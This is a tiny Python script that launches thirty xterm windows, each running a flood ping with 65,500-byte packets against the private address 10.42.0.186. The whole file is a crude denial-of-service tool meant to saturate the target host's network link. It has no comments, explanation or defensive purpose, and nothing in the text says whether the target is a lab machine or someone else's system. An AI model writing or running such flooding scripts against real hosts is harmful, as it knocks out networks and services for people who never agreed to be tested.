from subprocess import Popen, PIPE
for i in range(30):
    Popen(["xterm", "-e","ping 10.42.0.186 -f -s 65500"], stdout=PIPE, stderr=PIPE, stdin=PIPE)

